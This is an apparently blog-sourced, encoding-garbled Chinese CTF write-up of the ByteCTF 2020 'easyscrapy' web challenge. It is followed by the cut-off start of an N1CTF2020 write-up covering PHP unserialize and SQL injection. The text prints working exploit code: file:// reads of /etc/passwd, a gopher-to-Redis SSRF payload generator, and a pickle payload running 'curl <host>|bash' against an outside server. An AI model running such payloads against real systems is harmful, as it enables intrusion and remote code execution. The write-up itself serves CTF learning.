ç¬¬ä¸€å¤©ä¸Šåˆçš„è¯ï¼Œæ„Ÿè§‰çˆ¬ä»€ä¹ˆéƒ½çˆ¬ä¸åˆ°ã€‚ä½†æ˜¯å½“æ—¶å¾€è‡ªå·±çš„vpsä¸Šæ‰“çš„æ—¶å€™å€’æ˜¯æœ‰æ„å¤–çš„å‘ç°å½“æ—¶çš„ç¬”è®°: æ„å¤–å‘ç°äº†scrapy_redisä»¥åŠpycurlã€‚æ­£å¦‚ä¸Šé¢æ‰€è¯´ï¼Œurlæ•°æ®ä¼¼ä¹æ˜¯è¢«å­˜åˆ°redisç„¶åè¢«çˆ¬è™«ç»™çˆ¬äº†ã€‚è€Œåé¢/result?urlåˆ™æ˜¯åŠ¨ç”¨äº†å¦ä¸€ç§åŠŸèƒ½è¿›è¡Œpycurlçš„è¯·æ±‚ã€‚ è¿™é‡Œpycurlæ— ç–‘æ˜¯å€¼å¾—æ³¨æ„çš„,å› ä¸ºpycurlæœ¬è´¨ä¸Šä¼¼ä¹æ˜¯è·Ÿè°ƒç”¨curlä¸€æ ·çš„ã€‚é‚£ä¹ˆå¯ä»¥ä½¿ç”¨gopheråè®®ã€‚ è¿™æ ·ä¸€æ¥å½“ç„¶å°±æƒ³æ¢æµ‹redisäº†ã€‚ä¸è¿‡ç»è¿‡å°è¯•,ä¼šå‘ç°æ²¡æœ‰ä»»ä½•å›æ˜¾ã€‚å…³äºç‰ˆæœ¬ç­‰ç­‰ä¿¡æ¯ä¹Ÿæ˜¯ä¸€æ— æ‰€çŸ¥ã€‚ æ­¤æ—¶å†æ¬¡å®éªŒæ‰“è‡ªå·±ï¼Œæˆ‘å‘ç°å½“æ›´æ¢è‡ªå·±æœåŠ¡ç«¯çš„å†…å®¹æ—¶ï¼Œ/resultæ‰€æ˜¾ç¤ºçš„é¡µé¢å¹¶æ²¡æ”¹å˜ã€‚ è”ç³»åˆ°ä¸Šé¢çš„scrapy_redis,æˆ‘ä»¬ä¸éš¾æ¨æµ‹,scrapyä¼šçˆ¬æˆ‘ä»¬å­˜å‚¨çš„é‚£ä¸ªurl,å¹¶å°†å½“æ—¶çš„å†…å®¹ç¼“å­˜(åé¢ä¼šå‘ç°æ˜¯mongodb)ã€‚æ‰€ä»¥è¿™å°±å¯¼è‡´,åå¤ç”¨resulté¡µé¢è¯·æ±‚urlå¹¶ä¸ä¼šæ”¹å˜å›æ˜¾å†…å®¹ã€‚å……å…¶é‡è°ƒç”¨äº†pycurlè¯·æ±‚è€Œå·²ã€‚ é‚£ä¹ˆï¼Œåˆ°æ­¤æˆ‘ä»¬å¯¹æ•´ä¸ªæœåŠ¡çš„æ„æ¶æœ‰äº†å¤§æ¦‚çš„æ€è·¯ å­˜åœ¨çˆ¬è™«bot å­˜åœ¨redis å¯èƒ½å­˜åœ¨æŸæ•°æ®åº“ pycurl æ˜¯webæœåŠ¡è¯·æ±‚ï¼Œscrapy_redisæ˜¯çˆ¬è™«botè¯·æ±‚ ä½†æ˜¯è¿™äº›ä¿¡æ¯éå¸¸å±€é™ã€‚é¦–å…ˆåªæœ‰å­˜è¿›redisçš„æ•°æ®æ‰ä¼šè¢«çˆ¬è™«è¯·æ±‚,è¿™é‡Œpythonæ²¡æœ‰crlfå¿…ç„¶æ‰“ä¸äº†redis.è€Œpycurlè™½ç„¶å¯ä»¥ç”¨gopheré‚£ä¸€å¥—æ‰“,ä½†æ˜¯å†…ç½‘ä¿¡æ¯æœªçŸ¥,ä¸”æ²¡æœ‰å›æ˜¾ã€‚ è¿™æ—¶æˆ‘å¼€å§‹å°è¯•æ€§çˆ¬ä¸€äº›ç½‘ç«™ã€‚è®½åˆºçš„æ˜¯baiduèƒ½çˆ¬å®ƒè‡ªå·±çš„bytedanceçˆ¬ä¸äº†2333. ç„¶åçˆ¬æœ¬æœº127.0.0.1ä¹Ÿå®Œå…¨æ²¡æœ‰å†…å®¹(å› ä¸ºbotå¼€äº†ç«¯å£çš„æœåŠ¡å®é™…ä¸Šåªæœ‰ä¸€ä¸ª6023çš„telnet,æ‰“äº†ä¼šæå‰æŠ¥é”™,ä¸€æ ·æ— å›æ˜¾) é‚£ä¹ˆ,ä¸å¦¨å°è¯•ä¸‹æ‰“å®ƒçš„å…¬ç½‘ipï¼Ÿè¿™æ—¶æˆ‘å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„ç°è±¡ã€‚å½“æˆ‘è¾“å…¥å®ƒçš„å…¬ç½‘ipå­˜è¿›redisåï¼Œå®ƒé™¤äº†æœ¬èº«ï¼Œè¿˜è¯»å–äº†/listçš„é¡µé¢ã€‚ é‚£ä¹ˆè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ç®€å•çœ‹äº†ä¸‹é¡µé¢ã€‚å‘ç°é‡Œé¢å­˜åœ¨&lt;a href=&quot;/list&quot;&gt;&lt;/&gt;çœ‹æ¥ï¼Œçˆ¬è™«ç«¯æ˜¯ä¼šæ ¹æ®&lt;a href=&quot;xxx&quot;&gt;&lt;/a&gt;è¿›è¡Œè¿›ä¸€æ­¥çˆ¬å–.ç»è¿‡ç»å…¸çš„å®éªŒæ‰“è‡ªå·±ï¼Œå‘ç°çš„ç¡®å®ƒä¼šé¡ºç€è¿™ä¸ªhrefè¿›è¡Œè¯·æ±‚ã€‚ æ­¤æ—¶å·²ç»çŸ¥é“hrefæœ‰çŒ«è…»äº†ã€‚ç„¶åå‡ºé¢˜äººå·²ç»æ”¾å‡ºäº†ç¬¬ä¸€ä¸ªhintã€‚å°±æ˜¯å°è¯•è¯»æºç ã€‚ é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å°è¯•ä¸‹ï¼Œé¡ºç€è¿™ä¸ªhref+fileåè®®è¿›è¡Œæºç çš„é˜…è¯»ï¼Ÿ leak source codeåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå­˜å‚¨ 1&lt;html&gt;&lt;a href=\"file:///etc/passwd\"&gt;&lt;/a&gt;&lt;/html&gt; æ¥ç€ä¸Šé¢çš„è„šæœ¬è·‘ä¸€éã€‚ä¸€æŠŠæ¢­è§£å†³é—®é¢˜ã€‚å†æ¬¡è®¿é—®/resultã€‚å‘ç°è¯»åˆ°äº†/etc/passwd æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬ä¾æ¬¡è¯»ä¸‹å…¶ä»–å†…å®¹/proc/self/cmdline 1/bin/bash run.sh /proc/self/environå¾—çŸ¥å½“å‰PWDæ˜¯/code è¯»/code/run.sh 12#!/bin/bashscrapy crawl byte ä½¿ç”¨çš„æ˜¯scrapyæ¡†æ¶è¿›è¡Œçˆ¬å–ã€‚ æ­¤æ—¶å¼€å§‹è‡ªå·±ç›²ç›®çš„è¯»ç»“æœå‘ç°å•¥éƒ½æ²¡è¯»åˆ°,æƒ³äº†æƒ³å‘ç°è¿™ä¸ªçˆ¬è™«botå¯èƒ½åªæœ‰è¿™ä¹ˆä¸€ä¸ªå‘½ä»¤åœ¨è¿è¡Œã€‚é‚£ä¹ˆæˆ‘åº”è¯¥å»æŸ¥æ‰¾scrapyçš„æ–‡æ¡£æˆ‘ä»¬æ‰¾åˆ°scrapyå®˜æ–¹æ–‡æ¡£ æ˜¾ç„¶æˆ‘ä»¬åªéœ€è¯»å–scrapy.cfgå°±èƒ½æ‹¿åˆ°scrapyé¡¹ç›®åå¹¶è¯»å–åˆ°ä¸‹é¢æ‰€æœ‰æ–‡ä»¶ã€‚ä¸è¿‡spiderçš„åå­—ä¼¼ä¹æ˜¯è‡ªå®šä¹‰çš„ å‰é¢å‘½ä»¤è¡Œæ‰§è¡Œçš„æ˜¯scrapy crawl byteé‚£ä¹ˆå¯ä»¥ç¡®è®¤spiderçš„nameæ˜¯byte.æ–‡ä»¶åä¹Ÿå¯èƒ½æ˜¯byte. 1234567891011# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html[settings]default &#x3D; bytectf.settings[deploy]#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;project &#x3D; bytectf å…¶ä»–å†…å®¹ä¹Ÿéƒ½ä¸€å¹¶è¯»å–ã€‚å®Œæ•´çš„æ–‡ä»¶æˆ‘ä¼šæ”¾è‡ªå·±githubä¸Šã€‚åŒ…æ‹¬redisè·Ÿmongodbçš„docker æ­¤æ—¶æˆ‘é€šè¿‡pipelines.pyä¸settings.pyåˆ†åˆ«å¾—åˆ°äº†mongodbä¸redisçš„é…ç½® 1234567891011121314151617181920212223242526//pipelines.pyimport pymongoclass BytectfPipeline: def __init__(self): MONGODB_HOST = '127.0.0.1' MONGODB_PORT = 27017 MONGODB_DBNAME = 'result' MONGODB_TABLE = 'result' MONGODB_USER = 'N0rth3' MONGODB_PASSWD = 'E7B70D0456DAD39E22735E0AC64A69AD' mongo_client = pymongo.MongoClient(\"%s:%d\" % (MONGODB_HOST, MONGODB_PORT)) mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME) mongo_db = mongo_client[MONGODB_DBNAME] self.table = mongo_db[MONGODB_TABLE] def process_item(self, item, spider): quote_info = dict(item) print(quote_info) self.table.insert(quote_info) return item 123456789101112131415//settings.pyBOT_NAME = 'bytectf'SPIDER_MODULES = ['bytectf.spiders']NEWSPIDER_MODULE = 'bytectf.spiders'RETRY_ENABLED = FalseROBOTSTXT_OBEY = FalseDOWNLOAD_TIMEOUT = 8USER_AGENT = 'scrapy_redis'SCHEDULER = \"scrapy_redis.scheduler.Scheduler\"DUPEFILTER_CLASS = \"scrapy_redis.dupefilter.RFPDupeFilter\"REDIS_HOST = '172.20.0.7'REDIS_PORT = 6379ITEM_PIPELINES = &#123; 'bytectf.pipelines.BytectfPipeline': 300,&#125; ä»¥åŠä¸»è¦çš„çˆ¬è™«é€»è¾‘ã€‚çŸ¥é“äº†æ–‡ä»¶è¯»å–çš„æ¼æ´æ‰€åœ¨ 1234567891011121314151617181920212223242526272829303132333435import scrapyimport reimport base64from scrapy_redis.spiders import RedisSpiderfrom bytectf.items import BytectfItemclass ByteSpider(RedisSpider): name = 'byte' def parse(self, response): byte_item = BytectfItem() byte_item['byte_start'] = response.request.url url_list = [] test = response.xpath('//a/@href').getall() for i in test: if i[0] == '/': url = response.request.url + i else: url = i if re.search(r'://',url): r = scrapy.Request(url,callback=self.parse2,dont_filter=True) r.meta['item'] = byte_item yield r url_list.append(url) if(len(url_list)&gt;3): break byte_item['byte_url'] = response.request.url byte_item['byte_text'] = base64.b64encode((response.text).encode('utf-8')) yield byte_item def parse2(self,response): item = response.meta['item'] item['byte_url'] = response.request.url item['byte_text'] = base64.b64encode((response.text).encode('utf-8')) yield item å¯æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢â€¦â€¦æˆ‘ä»¬ä¸€æ ·ä¸çŸ¥é“flagåœ¨å“ªã€‚ç›®å‰çœ‹æ¥,å¦‚æœflagåœ¨botæœºå™¨ä¸Š,é‚£ä¹ˆåªæœ‰å¯èƒ½ä¼šæ˜¯æ‰“redisã€‚å¹¶ä¸”æŒ‰ç…§æˆ‘è‡ªå·±çš„å°‘æ•°ç»éªŒï¼Œä¸€èˆ¬æ˜¯æ­é…pickleååºåˆ—åŒ–rceæ‰æœ‰å¯èƒ½ã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„pickleååºåˆ—åŒ–ä»£ç ã€‚ æ­¤æ—¶é™·å…¥åƒµå±€ï¼Œåªæœ‰æœ¬åœ°è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ„å¤–å‘ç”Ÿäº†ã€‚ Run it locallyè¿™é“é¢˜æœ€é‡è¦çš„ä¸€ç‚¹ææ€•å°±æ˜¯æœ¬åœ°è·‘äº†ã€‚æ¯•ç«Ÿæ­¤æ—¶æˆ‘ä»¬å¯¹ç¯å¢ƒä¸€æ— æ‰€çŸ¥,æˆ‘å”¯ä¸€èƒ½æƒ³åˆ°çš„getshellæ–¹æ³•ä¹Ÿåªæœ‰pickleååºåˆ—åŒ–äº†ã€‚é‚£ä¹ˆè¯•è¯•æœ¬åœ°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰é”®å­˜äº†pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Ÿè¿™æ ·ä¸€æ¥å¿…ç„¶æœ‰æŸä¸ªåœ°æ–¹å­˜åœ¨ååºåˆ—åŒ–ã€‚ ç»è¿‡ä¸€ç•ªæŠ˜è…¾åã€‚æˆ‘ç®€å•å†™äº†ä¸ªèµ·mongodbçš„docker.å› ä¸ºredisè·Ÿçˆ¬è™«æœ¬åœ°èµ·æ¯”è¾ƒè½»æ¾,æˆ‘åˆä¸æƒ³æ”¹ä»£ç ã€‚(åé¢æ¯”èµ›ç»“æŸæ—¶å†™äº†ä¸ªå®Œæ•´ç‰ˆçš„,ç›´æ¥èµ·åº”è¯¥è·Ÿçº¿ä¸Šçš„bot+redis+mongoç¯å¢ƒåŸºæœ¬ä¸€è‡´äº†)docker-compose.yml 123456789101112version: '3'services: mongodb: image: mongo:4.2 container_name: py_db restart: always environment: MONGO_INITDB_ROOT_USERNAME: root MONGO_INITDB_ROOT_PASSWORD: root MONGO_INITDB_DATABASE: result volumes: - ./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro åŒç›®å½•ä¸‹mongo-init.js 12345678var data=&#123;\"test\":\"123\"&#125;//just for testdb.result.drop();db.result.insert(data);db.createUser(&#123; user: \"N0rth3\", pwd: \"E7B70D0456DAD39E22735E0AC64A69AD\", roles: [ &#123; role: \"readWrite\", db: \"result\", collection:\"result\" &#125;]&#125;); ç®€å•æ”¹ä¸‹çˆ¬è™«çš„redis/mongodb ip ,å°±èƒ½å¼€è·‘äº† ç„¶åæ­¤æ—¶æˆ‘å‘ç°ä¸€ç‚¹åŠ¨é™çš„éƒ½æ²¡æœ‰ã€‚æ„Ÿè§‰éå¸¸å¥‡æ€ªã€‚å€’æ˜¯çœ‹åˆ°scrapyå®ƒåœ¨å‡†å¤‡è¯»byte:start_urls æ—¢ç„¶å¦‚æ­¤é‚£set xx xxxè¯•è¯•çœ‹å¥½äº†ã€‚ç»“æœçªç„¶å‘ç°çˆ¬è™«ç›´æ¥å¼‚å¸¸é€€å‡ºï¼Ÿ çœ‹äº†ä¸‹æŠ¥é”™ã€‚ä¼¼ä¹æ˜¯åœ¨æ‰§è¡Œredisçš„LPOPæ“ä½œæŠ¥é”™çš„ã€‚é‚£å¯èƒ½æ˜¯æ•°æ®ç±»å‹çš„é—®é¢˜äº†ã€‚æ‰¾äº†ä¸‹ä¸€ç¯‡æ–‡ç« å‘ç°äº†åŸå› ã€‚ https://blog.csdn.net/zwq912318834/article/details/78854571å®ƒçˆ¬è™«çš„é€»è¾‘è·Ÿæˆ‘ä»¬çš„åŸºæœ¬ä¸€è‡´ã€‚å±äºåˆ†å¸ƒå¼çˆ¬è™«ã€‚å³ç­‰å¾…redisä¸­å‡ºç°redis_keyå†è¿›è¡Œçˆ¬å–ã€‚è€Œè¿™é‡Œå› ä¸ºä¸æ˜¯ç®€å•çš„ä»å­—ç¬¦ä¸²è¿›è¡Œè¯»å–ï¼Œè€Œæ˜¯ä»ä¸€ä¸ªé˜Ÿåˆ—é‡Œè¯»ä¸€ä¸ªå…ƒç´ ã€‚é‚£ä¹ˆè‡ªç„¶ä¸ä¼šè¯»åˆ°å†…å®¹äº†ã€‚ æœŸé—´,è½¬æˆ˜è™šæ‹Ÿæœºèµ·æœåŠ¡ã€‚è¿™ä¸€æ¬¡æˆ‘ä»¬ç”¨è„šæœ¬å†™å…¥æ•°æ®ã€‚å…¶å®å°±æ˜¯æ‰§è¡Œlpushè€Œå·²ã€‚ 123456789#!/usr/bin/env python# -*- coding:utf-8 -*-import redisredis_Host = \"127.0.0.1\"redis_key = 'byte:start_urls'rediscli = redis.Redis(host = redis_Host, port = 6379, db = \"0\")rediscli.lpush(redis_key, \"http://www.baidu.com\") è¿™æ—¶å°±å¯ä»¥æˆåŠŸå†™å…¥,çˆ¬å–æ•°æ®ï¼Œå¹¶å°†æ•°æ®å­˜è¿›mongodbã€‚è¿™é‡Œæˆ‘å†å°è¯•æ‰“ä¸€éredisè·Ÿmongodbã€‚å‘ç°è·ŸæœåŠ¡ç«¯è¿œç¨‹æ˜¯ä¸€è‡´çš„ã€‚æ‰“redisä¼šæå‰æŠ¥é”™ç»ˆæ­¢ï¼Œæ‰“mongodbä¼šæœ‰å›æ˜¾ ä¸è¿‡è¿™é‡Œrediså› ä¸ºlpopè¿™ä¸ªæ“ä½œã€‚å¯¼è‡´æˆ‘å†™å…¥çš„è¿™ä¸ªlistå¾ˆå¿«å°±ä¼šæ¶ˆå¤±ã€‚å®ƒå­˜çš„ä¹Ÿä¸æ˜¯pickleæ•°æ®ã€‚é‚£ä¹ˆè¦æ€ä¹ˆrce?æ­¤æ—¶å†åº¦é™·å…¥åƒµå±€ æ­¤æ—¶å®˜æ–¹æ”¾å‡ºç¬¬ä¸‰ä¸ªhint scrapy_redis,é¢˜ç›®ä»æ˜¯0è§£ã€‚æˆ‘å¼€å§‹æƒ³scrapy_redisæˆ‘ç¬¬ä¸€å¤©ä¸Šåˆå°±å‘ç°äº†è¿˜éœ€è¦æç¤ºï¼Ÿä½†æ˜¯è½¬å¿µæƒ³ä¼šä¸ä¼šæˆ‘æƒ³è¦çš„pickleæ“ä½œå­˜åœ¨äºscrapy_rediså‘¢ï¼Ÿ https://github.com/rmax/scrapy-redis äºæ˜¯ã€‚æˆ‘ç”¨scrapy-redis githubä¸Šçš„example-projectè·‘äº†éã€‚è¿™ä¸ªdemoæ˜¯æŒ‡å®šäº†urlä¸€ç›´åœ¨çˆ¬çš„ã€‚äºæ˜¯å½“æˆ‘è¿è¿›redisæ—¶ï¼Œæˆ‘å‘ç°äº†3ä¸ªé”®ã€‚å¹¶ä¸”å½“æˆ‘æŸ¥çœ‹ä»–ä»¬çš„æ—¶å€™,ç»ˆäºå‘ç°äº†å¿ƒå¿ƒå¿µå¿µçš„å†…å®¹ä¹Ÿå°±æ˜¯pickleçš„åºåˆ—åŒ–æ•°æ®ã€‚ æ—¢ç„¶å­˜åœ¨pickleåºåˆ—åŒ–çš„æ•°æ®ã€‚é‚£ä¹ˆå¿…ç„¶æŸä¸ªåœ°æ–¹ä¼šååºåˆ—åŒ–å®ƒã€‚è¿™æ ·ä¸€æ¥rceçš„é“¾æ¡ç«‹é©¬å°±æ¸…æ¥šäº†ã€‚è®¾ç½®é”® -&gt; pickle rce è·Ÿpwnhub6æœˆèµ›å·®ä¸å¤šäº†ã€‚ ä½†æ˜¯æœ¬åœ°ä¸ºä»€ä¹ˆæ²¡æœ‰byte:requestså‡ºç°å‘¢ï¼Ÿæˆ‘æ€€ç–‘æ˜¯å› ä¸ºæ¯æ¬¡åªä¼ å…¥ä¸€ä¸ªurlã€‚å¯¼è‡´å­˜æ´»æ—¶é—´æçŸ­ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨ç”¨å¤§é‡æ•°æ®å¡«å……è¿›redisã€‚æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œä¸Šé¢çš„è„šæœ¬åŠ ä¸ªforå¾ªç¯200æ¬¡å°±å¥½äº†ã€‚ç„¶åæˆ‘ä»¬åœ¨redisé‡Œæ‰§è¡Œå‡ æ¬¡çœ‹çœ‹zrange byte:requests 0 1 æ—¢ç„¶å¦‚æ­¤ã€‚åˆ©ç”¨é“¾å°±æ¸…æ¥šäº†ï¼šæƒ³åŠæ³•å†™å…¥byte:requestsé”®ï¼Œå†…å®¹ä¸ºåºåˆ—åŒ–æ•°æ®ã€‚è€Œå†™å…¥é”®å”¯æœ‰pycurlçš„ssrfå¯ä»¥åšåˆ°ã€‚ ä¸‹é¢å°±æ˜¯åˆ©ç”¨äº† ssrf -&gt; rce exploitè¿™é‡Œæˆ‘ä»¬é¦–å…ˆå°è¯•ä¸€ä¸‹ç›´æ¥å†™å…¥byte:requestsä¼šæ€ä¹ˆæ ·ã€‚ç„¶åæƒŠå–œçš„å‘ç°åªè¦å†™å…¥å°±ä¼šç›´æ¥è§¦å‘ååºåˆ—åŒ–ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ç›´æ¥åˆ©ç”¨/result?urlå°±å¯ä»¥æ‰“äº†ã€‚ ç„¶åæ¨æµ‹ä¸€æ³¢ç‰ˆæœ¬ï¼Œè¿™é‡Œæˆ‘æ‰“è¿œç¨‹ç”¨çš„protocolåè®®ä¸º2.0çš„pickleæˆåŠŸäº†ã€‚å½“æ—¶getshellæ²¡çœ‹pythonç‰ˆæœ¬,ä¼°è®¡æ˜¯2.7.(scrapy ä¸€èˆ¬åœ¨2.7 æˆ–3.5/3.6è·‘) ä¸€ä¸ªæ¯”è¾ƒå¤´ç–¼çš„ç‚¹æ˜¯å¦‚ä½•å†™å…¥opcodeçš„16è¿›åˆ¶æ•°æ®ã€‚ä¹‹å‰pwnhub6æœˆèµ›æ—¶å†™pickleæ•°æ®æ˜¯å› ä¸ºcrlfæ¯”è¾ƒç®€å•ã€‚å¯ä»¥ç›´æ¥åŠ ä¸ªå¼•å·æ‹¬èµ·æ¥å†™ã€‚è¿™é‡Œæˆ‘ä»¬åªèƒ½gopheræ‰“ã€‚é‚£ä¹ˆè½¬æ•°æ®æ—¶å‡ºäº†ä¸å°‘éº»çƒ¦ã€‚æœ€åæˆ‘ç®€å•æ”¹äº†ä¸‹redis-ssrfè¿™ä¸ªè„šæœ¬çš„å†…å®¹ã€‚ç”¨python2 è·‘ã€‚ç¡®è®¤å®ƒä¸ä¼šåƒpython3é‚£æ ·è‡ªåŠ¨è½¬ä¹‰æˆ‘çš„16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ç»ˆäºæ„é€ å‡ºå¯ä»¥æ‰“çš„payload python3 è¿è¡Œä»¥å¾—åˆ°pickle 16è¿›åˆ¶åºåˆ—åŒ–æ•°æ®ã€‚py2çš„ç›´æ¥å†™è²Œä¼¼æœ‰ç‚¹é—®é¢˜ã€‚ 1234567891011import pickleimport osclass exp(object): def __reduce__(self): s = \"\"\"curl 120.27.246.202|bash\"\"\" return (os.system, (s,))e = exp()s = pickle.dumps(e,protocol=2)print(s) python2 è¿è¡Œ convert.pyæ³¨æ„æˆ‘ä»¬æ‰§è¡Œçš„æ˜¯zaddã€‚å› ä¸ºä¹‹å‰æœ¬åœ°å·²ç»çŸ¥é“äº†requestsæ˜¯zsetç±»å‹æ•°æ®ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839from urllib import quotedef set_key(key,payload): cmd=[ \"zadd &#123;0&#125; 1 &#123;1&#125;\".format(key,payload), \"quit\" ] return cmddef redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x)))+CRLF+x cmd+=CRLF return cmddef generate_payload(): key = \"byte:requests\" payload =\"\"\"\\x80\\x02cposix\\nsystem\\nq\\x00X\\x18\\x00\\x00\\x00curl 120.27.246.202|bashq\\x01\\x85q\\x02Rq\\x03.\"\"\".replace(' ','\\x12') cmd=set_key(key,payload) protocol=\"gopher://\" ip=\"172.20.0.7\" port=\"6379\" payload=protocol+ip+\":\"+port+\"/_\" for x in cmd: payload += quote(redis_format(x).replace(\"^\",\" \")) return payloadif __name__==\"__main__\": passwd = '' p=generate_payload() print(p.replace('%12','%20')) ä¸€ä¸ªå°å‘æ˜¯æˆ‘çš„ç©ºæ ¼æ€»æ˜¯ä¼šè¢«é”™è½¬ã€‚äºæ˜¯å¹²è„†å…ˆæŠŠç©ºæ ¼å¡«å……ä¸€ä¸‹æœ€åå†æ¢å›%20å³å¯ã€‚ æ‰“æœ¬åœ°æˆäº†åï¼Œè¿œç¨‹å¿…ç„¶æ²¡æœ‰é—®é¢˜äº†ã€‚æœ€åå› ä¸ºgetä¼ å‚,æˆ‘ä»¬æ³¨æ„äºŒæ¬¡urlç¼–ç å³å¯ã€‚æ‰§è¡Œå‘½ä»¤curl xxx|bash(è¯»æ–‡ä»¶ç¡®è®¤æœ‰bash,pycurlç¡®è®¤æœ‰curl,åŒæ—¶ä¹‹å‰æŠŠå‘½ä»¤å¾€tmpä¸‹å†™æ—¶å‘ç°æœ‰readflag) getshell :) summary æ‰€ä»¥éå¸¸å¯æƒœã€‚åˆ©ç”¨é“¾æƒ³å¥½åç»“æœå»èµ¶é£æœºé”™è¿‡äº†æ¯”èµ›ä¸­è§£å‡ºçš„æœºä¼šã€‚ä¸è¿‡æ€è·¯è¿˜æ˜¯å¾ˆè€ƒéªŒäººçš„ã€‚é¢˜ç›®è´¨é‡å¾ˆé«˜ã€‚å°±æ˜¯æœ¬åœ°ç¯å¢ƒæœ‰ç‚¹ç£¨äººã€‚ã€‚ã€‚ æœ€ååˆ†äº«ä¸‹æˆ‘æŒ‰ç…§æºç æ­å¥½çš„dockerç¯å¢ƒã€‚https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"redis","slug":"redis","permalink":"https://www.bycsec.top/tags/redis/"}]},{"title":"N1CTF2020","slug":"N1CTF2020","date":"2020-10-19T13:11:14.000Z","updated":"2021-02-18T05:09:36.903Z","comments":true,"path":"2020/10/19/N1CTF2020/","link":"","permalink":"https://www.bycsec.top/2020/10/19/N1CTF2020/","excerpt":"N1CTFçš„é¢˜ç›®è´¨é‡æ¯‹åº¸ç½®ç–‘,å¯æƒœè‡ªå·±èƒ½åŠ›ä¸è¶³ã€‚é™¤äº†ç­¾åˆ°è¿˜çœ‹äº†easytp5,filters,è¿˜æœ‰æ¸—é€ç³»åˆ—çš„Victim.åŸºæœ¬éƒ½æ²¡æ€è·¯æˆ–è€…æ€è·¯è·‘åäº†â€¦â€¦æŠ“ç´§å¤ç°ä¸‹æ¥å­¦ä¹ å­¦ä¹ ã€‚","text":"N1CTFçš„é¢˜ç›®è´¨é‡æ¯‹åº¸ç½®ç–‘,å¯æƒœè‡ªå·±èƒ½åŠ›ä¸è¶³ã€‚é™¤äº†ç­¾åˆ°è¿˜çœ‹äº†easytp5,filters,è¿˜æœ‰æ¸—é€ç³»åˆ—çš„Victim.åŸºæœ¬éƒ½æ²¡æ€è·¯æˆ–è€…æ€è·¯è·‘åäº†â€¦â€¦æŠ“ç´§å¤ç°ä¸‹æ¥å­¦ä¹ å­¦ä¹ ã€‚ signinè¿™é¢˜æ‹¿çš„äºŒè¡€éš¾å—æ­»äº†,é”™å¤±ç©ºæŒ‡é’ˆé‚€è¯·ç â€¦â€¦(è¥¿æ¹–uploadä¹Ÿæ˜¯äºŒè¡€,è‡ªå·±äººæœ€è¿‘ä¹Ÿæœ‰ç‚¹æ°´é€†ï¼Œéš¾é“è¿™å°±æ˜¯2çš„è¯…å’’ä¹ˆï¼Ÿ:( ) source 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class ip &#123; public $ip; public function waf($info)&#123; &#125; public function __construct() &#123; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']); &#125;else&#123; $this-&gt;ip =$_SERVER[\"REMOTE_ADDR\"]; &#125; &#125; public function __toString()&#123; $con=mysqli_connect(\"localhost\",\"root\",\"********\",\"n1ctf_websign\"); $sqlquery=sprintf(\"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')\",$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time()); if(!mysqli_query($con,$sqlquery))&#123; return mysqli_error($con); &#125;else&#123; return \"your ip looks ok!\"; &#125; mysqli_close($con); &#125;&#125;class flag &#123; public $ip; public $check; public function __construct($ip) &#123; $this-&gt;ip = $ip; &#125; public function getflag()&#123; if(md5($this-&gt;check)===md5(\"key****************\"))&#123; readfile('/flag'); &#125; return $this-&gt;ip; &#125; public function __wakeup()&#123; if(stristr($this-&gt;ip, \"n1ctf\")!==False) $this-&gt;ip = \"welcome to n1ctf2020\"; else $this-&gt;ip = \"noip\"; &#125; public function __destruct() &#123; echo $this-&gt;getflag(); &#125;&#125;if(isset($_GET['input']))&#123; $input = $_GET['input']; unserialize($input);&#125; æ˜¾ç„¶æˆ‘ä»¬éœ€è¦getflagçš„è¯,éœ€è¦æ‹¿åˆ°æ•°æ®åº“é‡Œçš„key.è€Œkeyéœ€è¦é€šè¿‡sqlæ³¨å…¥è·å–ã€‚è¿™é‡Œå”¯ä¸€å­˜åœ¨æ³¨å…¥çš„åœ°æ–¹åœ¨ipçš„__toStringä¸­ã€‚æ•…é€šè¿‡ååºåˆ—åŒ–è§¦å‘__toStringå³å¯ã€‚è®¾ç½®flagç±»çš„ipä¸ºipç±»å°±å¯ä»¥åœ¨stristrå¤„è§¦å‘äº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯é»‘ç›’wafä¸‹è¿›è¡Œæ³¨å…¥çš„äº‹äº†ã€‚æˆ‘çš„æ€è·¯æ¯”è¾ƒç›´æ¥ã€‚ç›´æ¥æ—¶é—´ç›²æ³¨ã€‚å½“ç„¶è¿™é‡Œç¨å¾®æ„é€ 